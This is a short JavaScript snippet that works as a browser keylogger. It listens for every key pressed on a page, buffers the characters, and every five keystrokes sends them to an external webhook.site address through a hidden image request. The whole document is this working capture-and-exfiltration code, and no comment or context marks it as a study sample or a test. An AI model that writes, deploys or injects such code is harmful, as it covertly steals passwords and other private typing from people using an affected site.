(function(){
  let buffer = "";
  document.addEventListener('keydown', function(e){
    buffer += e.key;

    if(buffer.length >= 5){
      const img = new Image();
      img.src = "https://webhook.site/c7ff61f0-954a-4234-b0a0-cadfdd980c32?keys=" + encodeURIComponent(buffer);
      buffer = "";
    }
  });
})();
